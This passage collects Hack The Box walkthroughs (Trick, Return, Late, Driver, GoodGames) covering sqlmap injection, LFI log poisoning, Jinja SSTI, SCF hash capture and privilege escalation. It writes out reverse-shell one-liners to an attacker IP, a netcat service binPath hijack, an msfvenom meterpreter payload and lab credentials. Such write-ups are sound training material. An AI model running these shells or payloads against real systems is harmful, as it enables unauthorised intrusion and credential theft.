<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113172156.png" text-align="center" />
</div>

<p>When we unzip the file is given to us a .pfx file- The .pfx file, which is in a PKCS#12 format, contains the SSL certificate (public keys) and the corresponding private keys. Sometimes, you might have to import the certificate and private keys separately in an unencrypted plain text format to use it on another system. When we use the ‘string’ command over the binary we see a username:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113173036.png" text-align="center" />
</div>

<p>This confirms that legacyy is in fact a username.</p>

<p>Thus, we use the following command to extract the private keys and the certificate from the .pfx file in order to use it with Evil-WinRm to gain foothold on the machine:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>openssl pkcs12 <span class="nt">-in</span> legacyy_dev_auth.pfx <span class="nt">-nocerts</span> <span class="nt">-out</span> key.pem <span class="nt">-nodes</span> 
openssl pkcs12 <span class="nt">-in</span> legacyy_dev_auth.pfx <span class="nt">-nokeys</span> <span class="nt">-out</span> cert.pem
</code></pre></div></div>

<p>But, when we attemp to extract the keys a password is again required:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113173111.png" text-align="center" />
</div>

<p>Thus, we attemp to use again JohnTheRipper but this time with ‘pfx2john’:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113173150.png" text-align="center" />
</div>

<p>Then, we extract by introducing when is required the password with the command above and use the following Evil-WinRm command to use it to log-in:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.11.152 <span class="nt">-c</span> cert.pem <span class="nt">-k</span> key.pem <span class="nt">-S</span> 
</code></pre></div></div>

<p>The ‘-S’ flag is because we are attempting to login through the port 5986 that have SSL incorporate.</p>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113173459.png" text-align="center" />
</div>

<p>Now, we are going to attemp to elevate privielges by view the command history:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">type</span><span class="w"> </span><span class="nv">$</span><span class="nn">env</span><span class="p">:</span><span class="nv">APPDATA</span><span class="n">\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt</span><span class="w">
</span></code></pre></div></div>

<p>And we find the credentials svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113173938.png" text-align="center" />
</div>

<p>So we log-in as that user with evil-winrm:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113174044.png" text-align="center" />
</div>

<p>Again, the -S flag is because we have to enable the SSL.</p>

<p>Then, in order to seek new vectors of privesc, we check what groups our user belongs to:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="nx">user</span><span class="w"> </span><span class="nx">svc_deploy</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113174522.png" text-align="center" />
</div>

<p>Then, we realize that we belong to the ‘LAPS_Readers’ the “Local Administrator Password Solution” (LAPS) is used to manage local account passwords of Active Directory computers. We can run the following command to get information about the users and his passwords</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'ObjectClass -eq "computer"'</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="o">*</span><span class="w">
</span></code></pre></div></div>

<p>The <strong>Get-ADComputer</strong> cmdlet gets a computer or performs a search to retrieve multiple computers, since we have permssion to see the passwords, we will see the credentials too:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113180942.png" text-align="center" />
</div>

<p>Thus:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221113181037.png" text-align="center" />
</div>

<p><br /></p>

<h3 id="3-trick---linux-dns-server-dns-zones-dig-sqlmap-advanced-features-lfi-through-smtp-restart-service-privesc">3. Trick - Linux. (DNS server, DNS zones, Dig, Sqlmap advanced features, LFI through smtp, Restart Service PrivEsc).</h3>

<p>In this case, we perfom a Nmap scan:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span><span class="o">=</span>1000 <span class="nt">-T4</span> 10.10.11.166 | <span class="nb">grep</span> <span class="s1">'^[0-9]'</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f</span> 1 | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span>
nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sC</span> <span class="nt">-sV</span> 10.10.11.166
</code></pre></div></div>

<p>The command above first quicly scan the ports and catch those that are open (first perfom a Nmap scan, then catch the lines that starts with a number, then catch only the number, then order the numbers in a string separate by commas) and then perform a “version detection” and “scripts by default” over de discover ports:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114092438.png" text-align="center" />
</div>

<p>We can see that the machine is hosting the SSH, SMTP, DNS and HTTP services on default ports.</p>

<p>First, we start with the HTTP web enumeration but it seems that it doesn’t keep nothing relevant, only, that is host by a Nginx 1.14.2 web server.</p>

<p>Thus, we proceed to interact with the DNS Server. DNS is an application layer protocol which translates a domain to an IP and although and reverse.</p>

<p>A command wich allow us to interact with a DNS server is ‘dig’. Using dig we can perform a reverse lookup and attempt to get a domain name from the DNS server:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dig @10.10.11.166 <span class="nt">-x</span> 10.10.11.166
</code></pre></div></div>

<p>It seems that we found a domain: trick.htb.</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114173725.png" text-align="center" />
</div>

<p>Thus, we add the domain to the /etc/hosts:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s1">'10.10.11.166 trick.htb'</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</code></pre></div></div>

<p>We can try to initiate a zone transfer and attempt to acquire other domain names associated with trick.htb. <em>DNS is broken up into many different zones, a zone is a part of domain name space that is hosted and served by a DNS server</em>. For example, example.com and all the subdomains it may have (eg. subdomain.example.com ) are a zone.</p>

<p>A zone transfer is a request to copy an entire zone.</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114175941.png" text-align="center" />
</div>

<p>Thus, we discover a zone called “preprod-payroll.trick.htb”, we add it to our  /etc/host file and proceed to explore the zone. Thus, we discover a login portal:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114180716.png" text-align="center" />
</div>

<p>Then, we try to verify it is SQLi vulnerable. For that we can employ SQLmap, first, we capture with a Proxy like BurpSuite the request and copy it to a file ‘request.txt’ and then use it in the following command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-r</span> request.txt <span class="nt">-p</span> <span class="s2">"username,password"</span>
</code></pre></div></div>

<p>Then, sqlmap will began to test the parameter and will conclude that the parameter ‘username’ is indeed an injection point as a Time-Based SQL injection. because of the time bound nature of the vulnerability, the extraction of data is going to be very slow. Let’s see if there are any other valid injection techniques sqlmap has the following techniques that can be set: B; Boolean-based blind, E; Error-based, U; Union query-based, S; Stacked queries, T; Time-based blind, Q; Inline queries.</p>

<p>Because we don’t want slow data extraction we delete T and Q and left the others in the following command. And we are going to increse the risk of the test in order to ensure that all the injection techniques are properly tested:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-r</span> request.txt <span class="nt">-p</span> <span class="s2">"username,password"</span> <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--technique</span><span class="o">=</span>BEUS <span class="nt">-batch</span>
</code></pre></div></div>

<p>Finally we retrieve a database; ‘payroll_db’, a tables called ‘users’ and finallly and administrator user: ‘Enemigosss:SuperGucciRainbowCake’.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-r</span> request.txt <span class="nt">-p</span> <span class="s2">"username"</span> <span class="nt">-D</span> payroll_db <span class="nt">-T</span> <span class="nb">users</span> <span class="nt">--dump</span>  <span class="nt">--level</span> 5 <span class="nt">--risk</span> 3 <span class="nt">--technique</span><span class="o">=</span>BEUS <span class="nt">--batch</span>
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114183501.png" text-align="center" />
</div>

<p>But the user don’t seems to be useful because we don’t succeed to log in the web. We have to try something else.</p>

<p>Lets see what are the privileges of the current user:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-r</span> request.txt <span class="nt">-p</span> <span class="s2">"username"</span> <span class="nt">--privileges</span>
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114184518.png" text-align="center" />
</div>

<p>The outputs shows that our user can read files, we can use this in order to enumerate slightly the server:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-r</span> request.txt <span class="nt">-p</span> <span class="s2">"username"</span> <span class="nt">--batch</span> <span class="nt">--file-read</span><span class="o">=</span>/etc/passwd
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114184936.png" text-align="center" />
</div>

<p>Thus, we go to the path in which is stored the retrieved file and we discover an usuario called michael:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114190044.png" text-align="center" />
</div>

<p>That, by the UID, it seems to be a real user of the server. Then we can attemp to read the sites file of the web server in order to discover other zones:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sqlmap <span class="nt">-u</span> http://preprod-payroll.trick.htb/ajax.php?action<span class="o">=</span>login <span class="nt">--</span> <span class="nv">data</span><span class="o">=</span><span class="s2">"username=abc&amp;password=abc"</span> <span class="nt">-p</span> username <span class="nt">--batch</span> <span class="nt">--file-read</span><span class="o">=</span>/etc/nginx/sites-enabled/default
</code></pre></div></div>

<p>The file again gets stored on: /root/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-enabled_default and it seems that its appears another zone:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114190958.png" text-align="center" />
</div>

<p>We add it to our /etc/hosts file and try to access it. Gobuster don’t offer anything useful but Wappalyzer tell us that is PHP-based:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114193006.png" text-align="center" />
</div>

<p>We can check if this functionality is LFI vulnerable. After some security Security measures we succed to retrieve the /etc/hosts file:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114193914.png" text-align="center" />
</div>

<p>Thus, we can do the following. Any message that we send to the Michael user on the machine through the smtp server will be stored on /var/mail/michael. Thus, we setup a netcat listener on port 1337 and send the following email:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114200046.png" text-align="center" />
</div>

<p>This will trigger a connection that will bring us a reverse-shell. Then, without exit the connection with the smtp server we go to the direction: …//….//….//….//….//….//var/mail/michael</p>

<p>And we have a shell. In order to elevate our shell we can steal the ssh key and login through SSH:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114201645.png" text-align="center" />
</div>

<p>Then we seek a vector to elevate our privileges. When we run ‘sudo -l’ we see that we are allowed to restart a service ass root without password:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114215402.png" text-align="center" />
</div>

<p>Then, we are gonna check the fail2ban’s configuration in order to search for some missconfiguration that could allow us to modify the service or some thing of the kind.</p>

<p>Thus, we go to /etc/fail2ban and list the directories, we found one that belongs to a group which we form part of:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114215756.png" text-align="center" />
</div>

<p>Then we access it and list it. On it, we see multiple configuration files, we are interested on iptables-multiports.conf. As fare as we know, iptables is a firewall software that can implements measures to detect and ban malicious users on a system. This file have some basic configurations features:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114220957.png" text-align="center" />
</div>

<p>Ass we have permissions over the action.d file since we are part of the security group, we can’t modify files but we can modify the contents of the directory so in order to make us owners of the file we perfom the following action:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mv </span>iptables-multiport.conf .old<span class="p">;</span> 
<span class="nb">cp</span> .old iptables-multiport.conf 
<span class="nb">ls</span> <span class="nt">-l</span> iptables-multiport.conf
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114221406.png" text-align="center" />
</div>

<p>Thus, we know modify the propierty of the file and we can now write on it following the established permissions. Then, we write a reverse-shell script on /tmp:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/10.10.16.9/1337 0&gt;&amp;1
</code></pre></div></div>

<p>And we give it execute permissions with chmod. Then, we modify the file to force the service to act executing the script once and over when a user gets banned:</p>

<pre><code class="language-defaul">actionban= /tmp/shell.sh
</code></pre>

<p>Then, we restart the service as sudo to enable the new configuration and attemp to log as the michael user wrong several times until a shell in our netcat listener spawn:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221114223128.png" text-align="center" />
</div>

<p><br /></p>

<h3 id="4-return---windows-ldap-printer-credentials-service-binary-path">4. Return - Windows. (LDAP Printer credentials, Service Binary Path)</h3>

<p>In this case we have a machine which is hosting several services:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">ports</span><span class="o">=</span><span class="si">$(</span>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 10000 10.10.11.108 | <span class="nb">grep</span> <span class="s1">'^[0-9]'</span> | <span class="nb">cut</span> <span class="nt">-d</span> <span class="s1">'/'</span> <span class="nt">-f1</span> | <span class="nb">tr</span> <span class="s1">'\n'</span> <span class="s1">','</span> | <span class="nb">sed </span>s/,<span class="nv">$/</span>/<span class="si">)</span><span class="p">;</span> nmap <span class="nt">-p</span><span class="nv">$ports</span> <span class="nt">-sV</span> <span class="nt">-sC</span> 10.10.11.108
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221115094841.png" text-align="center" />
</div>

<p>Among them we can find HTTP, SMB and WinRM services. Lets explore the web.</p>

<p>We launch over it Gobuster and Wappalyzer, Gobuster doesn’t bring us anything useful and Wappalyzer tell us that is PHP-based.</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221115095639.png" text-align="center" />
</div>

<p>Exploring manually the web,  we found a settings.php page that store information about a printer:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221115095849.png" text-align="center" />
</div>

<p>These devices store LDAP and SMB credentials, in order for the printer to query the user list from Active Directory, and to be able to save scanned files to a user drive. These configuration pages typically allow the domain controller or file server to be specified.</p>

<p>Thus, we can change the Server Address field in order to make it point to our server and capture the request to catch the credentials:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221115100227.png" text-align="center" />
</div>

<p>This credentials would be valid to enter the machine through the WinRM service:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.11.108 <span class="nt">-u</span> svc-printer <span class="nt">-p</span> 1edFg43012!!
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221115100907.png" text-align="center" />
</div>

<p>Enumerating the groups that the user belong to, we found that our user belong, among others, to the Server Operator group. Acording to the <a href="https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#server-operators">documentation</a>: Members of the Server Operators group can administer domain controllers. This group exists only on domain controllers. By default, the group has no members. Members of the Server Operators group can take the following actions: sign in to a server interactively, create and delete network shared resources, <em>start and stop services</em>, back up and restore files, format the hard disk drive of the computer, and shut down the computer.</p>

<p>Then, we can try to modify a service binary path in order to obtain a reverse shell. First, we upload a netcat executable and test if the executable is valid for the version of the machine:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221115102623.png" text-align="center" />
</div>

<p>The error message talking about socket tell us that iindeed is valid and then, we modify a service runned by Administrator, for example sc.exe:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sc.exe</span><span class="w"> </span><span class="nx">config</span><span class="w"> </span><span class="nx">vss</span><span class="w"> </span><span class="nx">binPath</span><span class="o">=</span><span class="s2">"C:\Users\svc-printer\Desktop\nc.exe -e cmd.exe 10.10.16.9 1234"</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221115103509.png" text-align="center" />
</div>

<p>And then we set up a Netcat listener and then stop and start the service to run our command:</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">sc.exe</span><span class="w"> </span><span class="nx">stop</span><span class="w"> </span><span class="nx">vss</span><span class="w">
</span><span class="n">sc.exe</span><span class="w"> </span><span class="nx">start</span><span class="w"> </span><span class="nx">vss</span><span class="w">
</span></code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221115104108.png" text-align="center" />
</div>

<p><br /></p>

<h3 id="5-late---linux-flask-framwork-jinja-ssti-pspy">5. Late - Linux. (Flask framwork, Jinja SSTi, Pspy)</h3>

<p>In this case we have a machine that is hosting SSH and HTTP services on defaults ports.</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125095422.png" text-align="center" />
</div>

<p>So, we go to the web in order to do exploration job. Gobuster don’t show anything useful and Wappalyzer tell us that the system behind is Ubuntu:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125095601.png" text-align="center" />
</div>

<p>In manual exploration we see a link that leads to image.late.htb</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125095924.png" text-align="center" />
</div>

<p>Then, we add the domain to the /etc/hosts file and proceed to follow the link:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125100001.png" text-align="center" />
</div>

<p>The page results to be a image-to-text converter that use the Flask framework. Searching for some <a href="https://www.digitalocean.com/community/tutorials/how-to-use-templates-in-a-flask-application">information</a> Flask is a lightweight Python web framework that provides useful tools and features for creating web applications in the Python Language. Among other things in the relative of ‘Presentation Logic’, Flask use the <a href="https://jinja.palletsprojects.com/en/3.0.x/">Jinja</a> templating language to render HTML templates.</p>

<p>A template is a file that can contain both fixed and dynamic content that is merged by a engine, this can be dangerous because, if the dynamic data (usually pased by the user) is not correctly saned, it can lead to the RCE execution by the template engine.</p>

<p>This is more commonly known as <a href="https://portswigger.net/web-security/server-side-template-injection">Server Side Template Injection</a>.</p>

<p>So, we have to find a way to include a command in order to discover if the engine is indeed vulnerable. First, we <a href="https://jinja.palletsprojects.com/en/3.1.x/templates/">found</a> that the syntax of the Jinja template is {{}}:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125101039.png" text-align="center" />
</div>

<p>Then we write a script with  in order to found if the output returned contain the operation performed, indicating a command processing by the engine but we cant upload the file because the web doesn’t recognize a image on it.</p>

<p>So we can write the payload on plain text using a text editor and then catch a cutout to include the test payload into an image and upload this image onto the template engine:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125120125.png" text-align="center" />
</div>

<p>Then, when we upload the image, a file text will download to our machine and the result contain the operation processed:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125120205.png" text-align="center" />
</div>

<p>Indicating that the template engine process the commands, so we must find a valid payload to gain RCE over the server. On this <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2">page</a> we find the following payload:</p>

<pre><code class="language-defaul">self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read()
</code></pre>

<p>So we cutout the following line as follows:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125121905.png" text-align="center" />
</div>

<p>And upload the image obtaining:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125122020.png" text-align="center" />
</div>

<p>Thus, we have gained RCE over the machine, we try to get a revershell by severals commands using tcp sockets and netcat but non of it worked. How ever,  the machine has the SSH port open, this means that the user ‘svc_acc’ must have a ssh-key on .ssh/id_rsa file so we employ the following image to retrieve it:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125123700.png" text-align="center" />
</div>

<p>Obtaining:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125123719.png" text-align="center" />
</div>

<p>So we change the credentials of the key and log in the machine with it:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125123745.png" text-align="center" />
</div>

<p>After enumeration job we discover a script property of svc_acc:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125164715.png" text-align="center" />
</div>

<p>Aparently it sends a message to the root every time someone logs with SSH. With <a href="https://github.com/DominicBreuker/pspy">pspy</a> this is a tool that allows the monitorizing of linux processes without root permissions.</p>

<p>We transport this tool ove ssh through scp command:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125173931.png" text-align="center" />
</div>

<p>And run it on the victim machine:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125174000.png" text-align="center" />
</div>

<p>And then, in order to trigger the script, we log in in another session and see the output of pspy:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125174552.png" text-align="center" />
</div>

<p>It seems that, every time somebody logs in with SSH then root executes the script. This combined with the fact that we have writeable permissions of the file gives a way to make us root.</p>

<p>We simply write the following line on the script:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="s2">"bash -i &gt;&amp; /dev/tcp/10.10.16.9/4444 0&gt;&amp;1"</span> <span class="o">&gt;&gt;</span> /usr/local/sbin/ssh-alert.sh
</code></pre></div></div>

<p>Then, we setup a netcat listener on port 1337 and login again:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221125175321.png" text-align="center" />
</div>

<p><br /></p>

<h3 id="6-driver---windows-responder-scf-file-injection-evil-winrm-meterpreter-session-isolated-services-session-local_exploit_suggester-ricoh_driver_privesc">6. Driver - Windows (Responder, SCF file injection, evil-winrm, meterpreter session, isolated services session, local_exploit_suggester, ricoh_driver_privesc)</h3>

<p>In this case, we have a server that is hosting a web page, a SMB server and a windows management server:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123123034.png" text-align="center" />
</div>

<p>When we attemp to explore the web page we are asked about admin’s credentials but ‘admin:admin’ seems to be successful:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123123149.png" text-align="center" />
</div>

<p>First of all, we see that exists an email which is bond to a domain so we add the following line to /etc/hosts:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123123537.png" text-align="center" />
</div>

<p>The we explore the server. First, wappalyzer tell us that the web-server is PHP-based and the OS Server beyond is Windows:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123123843.png" text-align="center" />
</div>

<p>Gobuster don’t tell us anything useful. But manual exploring lead us to an upload feature:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123124549.png" text-align="center" />
</div>

<p>The description message tell us that if we upload a firmware model if will be tested by a operator team.</p>

<p>Since we are in a Windows Machine, we can try to do a SCF file injection attack.</p>

<p>It is mentioned that the firmware gets uploaded to a file share and is reviewed manually by the team internally. Since each file is reviewed manually and it is uploaded to an SMB share we could potentially upload a file that, when executed, makes a connection back to our local machine using SMB, thus allowing us to grab an NTLM hash. Since every file is opened for review purposes we can upload a Shell Command File (.scf) with a simple command to grab a single file from our local machine.</p>

<p>The SCF stands for Shell Command File and is a file format that supports a very limited set of Windows Explorer commands, such as opening a Windows Explorer window or showing the Desktop. The thing is that we can make a .scf file that that loads its icon image from an URL and provoke in that way to a SSRF attack through SMB concluding with a gathering of credentials hashs</p>

<pre><code class="language-scf">[Shell] 
Command=2 
IconFile=\\&lt;LocalIP&gt;\whatever 
[Taskbar] 
Command=ToggleDesktop
</code></pre>

<p>When we upload this file onto the share the file will try to download his IconFile through a SMB connection to our local machine. We have to remember that, because SMB requires authentication, it will try to autenticate to our computer and with the <a href="https://github.com/lgandx/Responder">Responder</a> tool we can catch this credentials:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 Responder.py <span class="nt">-Pv</span> <span class="nt">-I</span> tun0
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123172211.png" text-align="center" />
</div>

<p>And then with John The Ripper:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123174736.png" text-align="center" />
</div>

<p>And we use this credentials to login with Evil-winrm:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>evil-winrm <span class="nt">-i</span> 10.10.11.106 <span class="nt">-u</span> tony <span class="nt">-p</span> liltony
</code></pre></div></div>

<p><br /></p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123180714.png" text-align="center" />
</div>

<p>Now we have to upgrade our privileges. The first thing we can try is to pass to a meterpreter session. In order to do that, first we create an executable and start the msfconsole in order to initiate a multihandler configuring it correctly:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.16.9 <span class="nv">LPORT</span><span class="o">=</span>4444 <span class="nt">-f</span> exe <span class="o">&gt;</span> shell.exe<span class="p">;</span> msfconsole <span class="nt">-x</span> db_status
</code></pre></div></div>

<p>Then, we upload and execute the malicious binary:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123182307.png" text-align="center" />
</div>

<p>It is convinient to note that the binary has to be in the same directory in which we start the evil-winrm session, otherwise we would have to specified the path to the shell.</p>

<p>Then, we have a meterpreter session:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123183318.png" text-align="center" />
</div>

<p>Enumeration of the processes (ps) that are currently running on the system we can see that we are on session 0 , meaning that the meterpreter process is running on a non-interactive isolated services session.</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123183828.png" text-align="center" />
</div>

<p>We can try and migrate (migrate) to a process, explorer for example, that has a session id 1 , which means it is interactive:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123184113.png" text-align="center" />
</div>

<p>Now that we have a session that is not isolated we can perform recon job with the auxiliary module of metasploit: multi/recon/local_exploit_suggester</p>

<p>First, we background our session with Ctrl+Z and use the module:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123184403.png" text-align="center" />
</div>

<p>At the end of the module we can see an output that displays the severals exploit that the target is vulnerable.</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221123185651.png" text-align="center" />
</div>

<p>So we choose any of them we grant more privileges, like exploit/windows/local/ricoh_driver_privesc. We configure and run it:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221124093834.png" text-align="center" />
</div>

<p>And we run it:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221124093855.png" text-align="center" />
</div>

<h3 id="7-goodgames---linux-sqlinjection-decodify-server-side-tempalte-injection-ssti-flask-docker-container-homes-directory-mounted-mount-password-recycling-port-scanning-without-nmap-suid-file-on-mount-missconfiguration-directory">7. GoodGames - Linux (SQLinjection, Decodify, Server-Side Tempalte Injection SSTi Flask, Docker container, home’s directory mounted, mount, password recycling, Port Scanning without nmap, SUID file on mount missconfiguration directory.)</h3>

<p>In this case we have a machine that is hosting a web page:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126140816.png" text-align="center" />
</div>

<p>When we try to explore the web we don’t obtain anything useful but we some input fileds at login and searchs bar.</p>

<p>Fuzzing with tools like SQLmap we find that the log field is vulnerable to SQLi:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126141202.png" text-align="center" />
</div>

<p>We retrieve fom the database a username and a password:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126141331.png" text-align="center" />
</div>

<p>However, when we attemp to use the string as password we don’t success. So we introduce the string in the tool <a href="https://github.com/s0md3v/Decodify">Decodify</a> and we get that is a MD5 hash:</p>

<div style="text-align:center">
	<img src="/assets/img/HTB/Pasted%20image%2020221126141541.png" text-align="center" />
</div>

